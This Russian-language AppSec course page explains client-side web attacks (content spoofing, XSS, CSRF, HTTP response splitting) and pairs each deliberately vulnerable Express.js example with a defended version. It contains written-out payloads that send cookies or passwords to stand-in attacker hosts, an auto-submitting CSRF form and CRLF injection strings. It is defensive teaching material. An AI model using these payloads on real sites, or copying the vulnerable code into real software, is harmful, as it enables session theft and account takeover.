---
title: "Client-side Attacks — OWASP | Курс AppSec"
description: "OWASP Top 10 клиентские атаки: XSS (stored, reflected, DOM), CSRF, Clickjacking — векторы эксплуатации и защита приложений."
keywords: "OWASP, XSS, CSRF, Clickjacking, клиентские атаки, AppSec, веб-безопасность, DOM, cross-site scripting, stored XSS, reflected XSS, Шмаков Илья, Elijah Shmakov, geminishkv, AppSecTA"
---

<div class="hero-section hero-section--compact">
  <div class="hero-content">
    <h1 class="hero-title">OWASP — Client-side Attacks</h1>
    <p class="hero-sub">Атаки на стороне клиента · OWASP Top 10</p>
  </div>
</div>

## О документе

Клиентские атаки направлены против браузера и пользовательского окружения, а не против серверной части приложения. Наиболее распространённые типы: XSS (Cross-Site Scripting) — внедрение вредоносного JavaScript в страницу, CSRF (Cross-Site Request Forgery) — выполнение нежелательных действий от имени аутентифицированного пользователя, и Clickjacking — перехват кликов через прозрачные iframe-оверлеи.

DOM-based XSS особенно опасен, поскольку вредоносный код исполняется без обращения к серверу и не фиксируется в серверных логах. Эффективные меры защиты: Content Security Policy (CSP), заголовок `X-Frame-Options`, SameSite cookie-атрибуты и валидация всех пользовательских данных на стороне клиента.

Данные уязвимости проверяются в [лабораторной работе №8 (DAST)](../../labs/basic/lab08.md) с помощью OWASP ZAP. Смотри также: [Command Execution](command-execution.md), [Information Disclosure](information-disclosure.md).

***

## Содержание документа

Этот раздел описывает атаки на пользователей Web-сервера. Во время посещения сайта, между пользователем и сервером устанавливаются доверительные отношения, как в технологическом, так и в психологическом аспектах. Пользователь ожидает, что сайт предоставит ему легитимное содержимое. Кроме того, пользователь не ожидает атак со стороны сайта. Эксплуатируя это доверие, злоумышленник может использовать различные методы для проведения атак на клиентов сервера.

### Подмена содержимого (Content Spoofing)

Используя эту технику, злоумышленник заставляет пользователя поверить, что страницы сгенерированы Web-сервером, а не переданы из внешнего источника.

Некоторые Web-страницы создаются с использованием динамических источников HTML-кода. К примеру, расположение фрейма (`<frame src="http://foo.example/file.html">`) может передаваться в параметре URL (`http://foo.example/page?frame_src=http://foo.example/file.html`). Атакующий может заменить значение параметра `frame_src` на `frame_src=http://attacker.example/spoof.html`. Когда будет отображаться результирующая страница, в строке адреса браузера пользователя будет отображаться адрес сервера (`foo.example`), но также на странице будет присутствовать внешнее содержимое, загруженное с сервера атакующего (`attacker.example`), замаскированное под легальный контент.

Специально созданная ссылка может быть прислана по электронной почте, системе моментального обмена сообщениями, опубликована на доске сообщений или открыта в браузере пользователя с использованием межсайтового выполнения сценариев.

Таким образом, произойдет "дефэйс" сайта `http://foo.example` на стороне пользователя, поскольку содержимое сервера будет загружено с сервера `http://attacker.example`. Эта атака также может использоваться для создания ложных страниц, таких как формы ввода пароля, пресс-релизы и т.д.

!!! example "Пример: создание ложного пресс-релиза"

    Предположим, что Web-сервер динамически генерирует фреймы на странице с пресс-релизами компании. Когда пользователь перейдет по ссылке `http://foo.example/pr?pg=http://foo.example/pr/01012003.html` в его браузер загрузится страница следующего содержания:

    ```html
    <HTML>
    <FRAMESET COLS="100, *">
      <FRAME NAME="pr_menu" SRC="menu.html">
      <FRAME NAME="pr_content" SRC="http://foo.example/pr/01012003.html">
    </FRAMESET>
    </HTML>
    ```

    Приложение `pr` создает страницу с меню и динамически генерируемым значением тега `FRAME SRC`. Фрейм `pr_content` отображает страницу, указанную в параметре `pg` HTTP-запроса. Но поскольку атакующий изменил нормальный URL на:

    ```
    http://foo.example/pr?pg=http://attacker.example/spoofed_press_release.html
    ```

    и сервер не проводит проверки параметра `pg`, результирующий HTML код будет:

    ```html
    <HTML>
    <FRAMESET COLS="100, *">
      <FRAME NAME="pr_menu" SRC="menu.html">
      <FRAME NAME="pr_content" SRC="http://attacker.example/spoofed_press_release.html">
    </FRAMESET>
    </HTML>
    ```

    Для конечного пользователя содержимое, загруженное с сервера `attacker.example`, будет выглядеть как страница сервера `foo.example`.

!!! example "Практический пример: DOM-манипуляция через location.hash"

    Современные SPA-приложения часто используют `location.hash` для маршрутизации. Если содержимое хэша вставляется в DOM без санитизации, злоумышленник может подменить содержимое страницы.

    === "Уязвимый код"

        ```javascript
        // Клиентский код читает hash и вставляет в DOM без проверки
        const content = decodeURIComponent(location.hash.substring(1));
        document.getElementById("main").innerHTML = content;

        // Атакующий формирует ссылку:
        // https://trusted-site.example/#<h1>Срочно смените пароль!</h1>
        // <form action="https://evil.example/steal">
        //   <input name="password" type="password" placeholder="Новый пароль">
        //   <button>Подтвердить</button>
        // </form>
        ```

    === "Защищённый код"

        ```javascript
        // Используем textContent вместо innerHTML — HTML-теги не интерпретируются
        const content = decodeURIComponent(location.hash.substring(1));
        document.getElementById("main").textContent = content;

        // Либо, если нужна разметка — применяем DOMPurify
        import DOMPurify from "dompurify";

        const raw = decodeURIComponent(location.hash.substring(1));
        const safe = DOMPurify.sanitize(raw, { ALLOWED_TAGS: ["b", "i", "em", "strong"] });
        document.getElementById("main").innerHTML = safe;
        ```

!!! info "Ссылки"

    - [OWASP — Content Spoofing](https://owasp.org/www-community/attacks/Content_Spoofing)

### Межсайтовое выполнение сценариев (Cross-site Scripting, XSS)

Наличие уязвимости Cross-site Scripting позволяет атакующему передать серверу исполняемый код, который будет перенаправлен браузеру пользователя. Этот код обычно создается на языках HTML/JavaScript, но могут быть использованы VBScript, ActiveX, Java, Flash или другие поддерживаемые браузером технологии.

Переданный код исполняется в контексте безопасности (или зоне безопасности) уязвимого сервера. Используя эти привилегии, код получает возможность читать, модифицировать или передавать важные данные, доступные с помощью браузера. У атакованного пользователя может быть скомпрометирован аккаунт (кража cookie), его браузер может быть перенаправлен на другой сервер или осуществлена подмена содержимого сервера. В результате тщательно спланированной атаки злоумышленник может использовать браузер жертвы для просмотра страниц сайта от имени атакуемого пользователя.

Код может передаваться злоумышленником в URL, в заголовках HTTP-запроса (cookie, user-agent, referer), значениях полей форм и т.д.

Существует два типа атак, приводящих к межсайтовому выполнению сценариев: **постоянные (сохраненные)** и **непостоянные (отраженные)**. Основным отличием между ними является то, что в отраженном варианте передача кода серверу и возврат его клиенту осуществляется в рамках одного HTTP-запроса, а в хранимом -- в разных.

Осуществление непостоянной атаки требует, чтобы пользователь перешел по ссылке, сформированной злоумышленником. В процессе загрузки сайта код, внедренный в URL или заголовки запроса будет передан клиенту и выполнен в его браузере. Сохраненная разновидность уязвимости возникает, когда код передается серверу и сохраняется на нем на некоторый промежуток времени. Наиболее популярными целями атак в этом случае являются форумы, почта с Web-интерфейсом и чаты. Для атаки пользователю не обязательно переходить по ссылке, достаточно посетить уязвимый сайт.

#### Сохраненный вариант атаки (Stored XSS)

Многие сайты имеют доски объявлений и форумы, которые позволяют пользователям оставлять сообщения. Зарегистрированный пользователь обычно идентифицируется по номеру сессии, сохраняемому в cookie. Если атакующий оставит сообщение, содержащее код на языке JavaScript, он получит доступ к идентификатору сессии пользователя.

!!! example "Пример: кража cookie через Stored XSS"

    Код для передачи cookie на сервер злоумышленника:

    ```html
    <SCRIPT>
    document.location='http://attackerhost.example/cgi-bin/cookiesteal.cgi?'+document.cookie
    </SCRIPT>
    ```

!!! example "Практический пример: Stored XSS в Express.js"

    === "Уязвимый код"

        ```javascript
        const express = require("express");
        const app = express();
        app.use(express.urlencoded({ extended: true }));

        const comments = []; // хранилище комментариев

        // Сохранение комментария без санитизации
        app.post("/comment", (req, res) => {
          comments.push(req.body.text); // пользовательский ввод сохраняется as-is
          res.redirect("/");
        });

        // Отображение комментариев — вставка в HTML без экранирования
        app.get("/", (req, res) => {
          const html = comments.map((c) => `<div class="comment">${c}</div>`).join("");
          res.send(`<html><body>${html}</body></html>`);
        });

        // Атакующий отправляет комментарий:
        // <script>fetch('https://evil.example/steal?c='+document.cookie)</script>
        // Каждый посетитель страницы выполнит этот скрипт
        ```

    === "Защищённый код"

        ```javascript
        const express = require("express");
        const { JSDOM } = require("jsdom");
        const DOMPurify = require("dompurify")(new JSDOM("").window);
        const helmet = require("helmet");
        const app = express();
        app.use(express.urlencoded({ extended: true }));

        // helmet устанавливает CSP и другие заголовки безопасности
        app.use(
          helmet({
            contentSecurityPolicy: {
              directives: {
                defaultSrc: ["'self'"],
                scriptSrc: ["'self'"],  // запрет inline-скриптов
                styleSrc: ["'self'", "'unsafe-inline'"],
              },
            },
          })
        );

        const comments = [];

        // Санитизация при сохранении
        app.post("/comment", (req, res) => {
          const clean = DOMPurify.sanitize(req.body.text, { ALLOWED_TAGS: ["b", "i", "em", "a"] });
          comments.push(clean);
          res.redirect("/");
        });

        // Экранирование при выводе
        function escapeHtml(str) {
          return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
                    .replace(/"/g, "&quot;").replace(/'/g, "&#039;");
        }

        app.get("/", (req, res) => {
          const html = comments.map((c) => `<div class="comment">${escapeHtml(c)}</div>`).join("");
          res.send(`<html><body>${html}</body></html>`);
        });
        ```

#### Отраженный вариант атаки (Reflected XSS)

Многие серверы предоставляют пользователям возможность поиска по содержимому сервера. Как правило, запрос передается в URL и содержится в результирующей странице.

!!! example "Пример: Reflected XSS через поисковую строку"

    При переходе по URL `http://portal.example/search?q="fresh beer"` пользователю будет отображена страница, содержащая результаты поиска и фразу: "По вашему запросу fresh beer найдено 0 страниц". Если в качестве искомой фразы будет передан JavaScript, он выполнится в браузере пользователя:

    ```
    http://portal.example/search/?q=<script>alert("xss")</script>
    ```

    Для сокрытия кода сценария может быть использована кодировка URLEncode:

    ```
    http://portal.example/index.php?sessionid=12312312&
    username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65
    %6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70
    %3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65
    %78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F
    %6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64
    %6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73
    %63%72%69%70%74%3E
    ```

!!! example "Практический пример: Reflected XSS в Express.js"

    === "Уязвимый код"

        ```javascript
        const express = require("express");
        const app = express();

        // Поисковый эндпоинт отражает пользовательский ввод в HTML без экранирования
        app.get("/search", (req, res) => {
          const query = req.query.q || "";
          res.send(`
            <html>
            <body>
              <h2>Результаты поиска для: ${query}</h2>
              <p>Ничего не найдено.</p>
            </body>
            </html>
          `);
        });

        // Вектор атаки:
        // /search?q=<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
        ```

    === "Защищённый код"

        ```javascript
        const express = require("express");
        const helmet = require("helmet");
        const app = express();

        app.use(helmet());

        function escapeHtml(str) {
          return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
                    .replace(/"/g, "&quot;").replace(/'/g, "&#039;");
        }

        app.get("/search", (req, res) => {
          const query = escapeHtml(req.query.q || "");
          res.send(`
            <html>
            <body>
              <h2>Результаты поиска для: ${query}</h2>
              <p>Ничего не найдено.</p>
            </body>
            </html>
          `);
        });
        ```

#### DOM-based XSS

!!! warning "Внимание"

    DOM-based XSS особенно опасен тем, что вредоносный payload никогда не покидает браузер — он не передаётся на сервер и, соответственно, не фиксируется в серверных логах. WAF и серверная валидация в этом случае бесполезны.

!!! example "Практический пример: DOM-based XSS"

    === "Уязвимый код"

        ```javascript
        // Клиентский код берёт данные из URL и вставляет в DOM
        // URL: https://app.example/welcome#<img src=x onerror=alert(document.cookie)>
        const name = decodeURIComponent(location.hash.substring(1));
        document.getElementById("greeting").innerHTML = `Добро пожаловать, ${name}!`;
        ```

    === "Защищённый код"

        ```javascript
        import DOMPurify from "dompurify";

        const raw = decodeURIComponent(location.hash.substring(1));

        // Вариант 1: textContent — полностью исключает HTML-интерпретацию
        document.getElementById("greeting").textContent = `Добро пожаловать, ${raw}!`;

        // Вариант 2: DOMPurify — если нужна частичная разметка
        const safe = DOMPurify.sanitize(raw);
        document.getElementById("greeting").innerHTML = `Добро пожаловать, ${safe}!`;
        ```

    Дополнительная защита на стороне сервера — заголовок CSP:

    ```javascript
    // Express.js — настройка Content-Security-Policy через helmet
    const helmet = require("helmet");
    app.use(
      helmet({
        contentSecurityPolicy: {
          directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],           // запрет inline-скриптов и eval
            objectSrc: ["'none'"],
            baseUri: ["'self'"],
          },
        },
      })
    );
    ```

!!! info "Ссылки"

    - [OWASP — Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
    - [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
    - [OWASP DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
    - [CERT Advisory CA-2000-02 — Malicious HTML Tags Embedded in Client Web Requests](http://www.cert.org/advisories/CA-2000-02.html)
    - [The Cross Site Scripting FAQ — CGISecurity.com](http://www.cgisecurity.com/articles/xss-faq.shtml)
    - [Character entity references in HTML 4](http://www.w3.org/TR/html4/sgml/entities.html)
    - [HTML Code Injection and Cross-site Scripting](http://www.technicalinfo.net/papers/CSS.html) — By Gunter Ollmann

### Подделка межсайтовых запросов (Cross-Site Request Forgery, CSRF)

CSRF-атака заставляет браузер аутентифицированного пользователя отправить поддельный HTTP-запрос, включая сессионный cookie и любую другую автоматически включаемую информацию аутентификации, уязвимому веб-приложению. Это позволяет злоумышленнику генерировать запросы от имени жертвы через её браузер.

!!! warning "Внимание"

    CSRF эксплуатирует доверие сайта к браузеру пользователя. В отличие от XSS, который эксплуатирует доверие пользователя к сайту, CSRF работает в обратном направлении — используется тот факт, что браузер автоматически прикрепляет cookie к каждому запросу на домен.

!!! example "Практический пример: CSRF при смене email"

    === "Уязвимый код"

        ```javascript
        const express = require("express");
        const session = require("express-session");
        const app = express();
        app.use(express.urlencoded({ extended: true }));
        app.use(session({ secret: "keyboard cat", resave: false, saveUninitialized: false }));

        // Эндпоинт смены email — нет CSRF-защиты
        app.post("/account/email", (req, res) => {
          if (!req.session.userId) return res.status(401).send("Unauthorized");
          // Email меняется без проверки источника запроса
          updateEmail(req.session.userId, req.body.email);
          res.send("Email обновлён");
        });
        ```

        Страница злоумышленника `evil.example/attack.html`:

        ```html
        <!-- Автоматическая отправка формы при загрузке страницы -->
        <html>
        <body onload="document.getElementById('csrf-form').submit()">
          <form id="csrf-form" action="https://trusted-app.example/account/email" method="POST">
            <input type="hidden" name="email" value="attacker@evil.example">
          </form>
        </body>
        </html>
        ```

    === "Защищённый код"

        ```javascript
        const express = require("express");
        const session = require("express-session");
        const crypto = require("crypto");
        const app = express();
        app.use(express.urlencoded({ extended: true }));
        app.use(session({ secret: "keyboard cat", resave: false, saveUninitialized: false }));

        // Генерация CSRF-токена
        function generateCsrfToken(req) {
          if (!req.session.csrfToken) {
            req.session.csrfToken = crypto.randomBytes(32).toString("hex");
          }
          return req.session.csrfToken;
        }

        // Middleware проверки CSRF-токена
        function verifyCsrf(req, res, next) {
          const token = req.body._csrf || req.headers["x-csrf-token"];
          if (!token || token !== req.session.csrfToken) {
            return res.status(403).send("Недействительный CSRF-токен");
          }
          next();
        }

        // Форма с CSRF-токеном
        app.get("/account/email", (req, res) => {
          const token = generateCsrfToken(req);
          res.send(`
            <form action="/account/email" method="POST">
              <input type="hidden" name="_csrf" value="${token}">
              <input type="email" name="email" placeholder="Новый email">
              <button type="submit">Обновить</button>
            </form>
          `);
        });

        // Защищённый эндпоинт
        app.post("/account/email", verifyCsrf, (req, res) => {
          if (!req.session.userId) return res.status(401).send("Unauthorized");
          updateEmail(req.session.userId, req.body.email);
          res.send("Email обновлён");
        });
        ```

    Дополнительная защита — `SameSite` cookie-атрибут:

    ```javascript
    app.use(
      session({
        secret: "keyboard cat",
        resave: false,
        saveUninitialized: false,
        cookie: {
          httpOnly: true,
          secure: true,        // только HTTPS
          sameSite: "strict",  // cookie не отправляется при cross-site запросах
        },
      })
    );
    ```

!!! info "Ссылки"

    - [OWASP — Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)
    - [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

### Расщепление HTTP-ответа (HTTP Response Splitting)

При использовании данной уязвимости злоумышленник посылает серверу специальным образом сформированный запрос, ответ на который интерпретируется целью атаки как два разных ответа. Второй ответ полностью контролируется злоумышленником, что дает ему возможность подделать ответ сервера.

В реализации атак с расщеплением HTTP-ответа участвуют как минимум три стороны:

- **Web-сервер**, содержащий подобную уязвимость
- **Цель атаки**, взаимодействующая с Web-сервером под управлением злоумышленника (типично -- кэширующий сервер-посредник или кэш браузера)
- **Атакующий**, инициирующий атаку

Возможность осуществления атаки возникает, когда сервер возвращает данные, предоставленные пользователем, в заголовках HTTP-ответа. Обычно это происходит при перенаправлении пользователя на другую страницу (коды HTTP 3xx) или когда данные, полученные от пользователя, сохраняются в cookie.

Основой расщепления HTTP-ответа является внедрение символов перевода строки (CR и LF) таким образом, чтобы сформировать две HTTP-транзакции, в то время как реально будет происходить только одна.

В результате успешной реализации этой атаки злоумышленник может выполнить следующие действия:

- **Межсайтовое выполнение сценариев**
- **Модификация данных кэша сервера-посредника.** Некоторые кэширующие серверы-посредники (Squid 2.4, NetCache 5.2, Apache Proxy 2.0 и ряд других) сохраняют подделанный злоумышленником ответ на жестком диске и на последующие запросы пользователей по данному адресу возвращают кэшированные данные
- **Межпользовательская атака** (один пользователь, одна страница, временная подмена страницы). Используется тот факт, что некоторые серверы-посредники разделяют одно TCP-соединение к серверу между несколькими пользователями
- **Перехват страниц, содержащих пользовательские данные.** Злоумышленник получает ответ сервера вместо самого пользователя

!!! example "Пример: HTTP Response Splitting через JSP"

    JSP-страница `/redir_lang.jsp`:

    ```jsp
    <%
    response.sendRedirect("/by_lang.jsp?lang="+
    request.getParameter("lang"));
    %>
    ```

    Когда данная страница вызывается с параметром `lang=English`, она направляет браузер на страницу `/by_lang.jsp?lang=English`. Типичный ответ сервера:

    ```http
    HTTP/1.1 302 Moved Temporarily
    Date: Wed, 24 Dec 2003 12:53:28 GMT
    Location: http://10.1.1.1/by_lang.jsp?lang=English
    Server: WebLogic XMLX Module 8.1 SP1 Fri Jun 20 23:06:40 PDT 2003 271009 with
    Content-Type: text/html
    Set-Cookie: JSESSIONID=1pMRZOiOQzZiE6Y6iivsREg82pq9Bo1ape7h4YoHZ62RXjApqwBE!-1251019693; path=/
    Connection: Close
    ```

    При реализации атаки злоумышленник посылает в качестве значения `lang` символы перевода строки, для того, чтобы закрыть ответ сервера и сформировать ещё один:

    ```
    /redir_lang.jsp?lang=foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Shazam</html>
    ```

    При обработке этого запроса сервер передаст следующие данные:

    ```http
    HTTP/1.1 302 Moved Temporarily
    Date: Wed, 24 Dec 2003 15:26:41 GMT
    Location: http://10.1.1.1/by_lang.jsp?lang=foobar
    Content-Length: 0

    HTTP/1.1 200 OK
    Content-Type: text/html
    Content-Length: 19

    <html>Shazam</html>
    ```

    Эти данные будут обработаны клиентом следующим образом:

    1. Первый ответ с кодом 302 будет командой перенаправления
    2. Второй ответ (код 200) объемом в 19 байт будет считаться содержимым той страницы, на которую происходит перенаправление
    3. Остальные данные, согласно спецификации HTTP, игнорируются клиентом

!!! example "Практический пример: Header Injection в Express.js"

    === "Уязвимый код"

        ```javascript
        const express = require("express");
        const app = express();

        // Эндпоинт устанавливает язык через redirect — значение берётся из параметра без валидации
        app.get("/set-lang", (req, res) => {
          const lang = req.query.lang;
          // CRLF-символы в lang позволяют внедрить произвольные заголовки
          res.redirect(`/page?lang=${lang}`);
        });

        // Вектор атаки:
        // /set-lang?lang=en%0d%0aSet-Cookie:%20admin=true%0d%0a%0d%0a<script>alert(1)</script>
        // Результат — злоумышленник внедряет cookie и HTML в ответ сервера
        ```

    === "Защищённый код"

        ```javascript
        const express = require("express");
        const app = express();

        // Белый список допустимых значений
        const ALLOWED_LANGS = new Set(["en", "ru", "de", "fr", "es"]);

        app.get("/set-lang", (req, res) => {
          const lang = req.query.lang;

          // Валидация по белому списку
          if (!ALLOWED_LANGS.has(lang)) {
            return res.status(400).send("Недопустимое значение языка");
          }

          // Дополнительно: удаление CR/LF на уровне фреймворка
          // Express 4.x+ автоматически экранирует CRLF в res.redirect(),
          // но явная валидация — обязательная мера
          res.redirect(`/page?lang=${encodeURIComponent(lang)}`);
        });
        ```

!!! info "Ссылки"

    - [OWASP — HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)
    - [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers](https://cwe.mitre.org/data/definitions/113.html)
    - [CRLF Injection](http://www.securityfocus.com/archive/1/271515) — by Ulf Harnhammar
